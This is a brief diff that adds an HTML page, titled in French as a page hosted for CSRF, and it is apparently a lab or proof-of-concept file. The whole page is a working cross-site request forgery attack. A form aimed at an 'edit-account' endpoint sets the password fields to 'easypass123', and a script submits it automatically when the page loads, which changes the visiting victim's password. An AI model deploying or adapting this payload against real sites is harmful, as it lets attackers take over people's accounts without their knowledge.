@@ -1,0 +1,9 @@
+<h1>Page hébergée pour CSRF</h1>
+<form action="https://example.ex/edit-account" method="post">
+<input type="password" name="password" value="easypass123">
+<input type="password" name="confirm-password" value="easypass123">
+<button type="submit">Edit</button>
+</form>
+<script>
+document.forms[0].submit();
+</script>
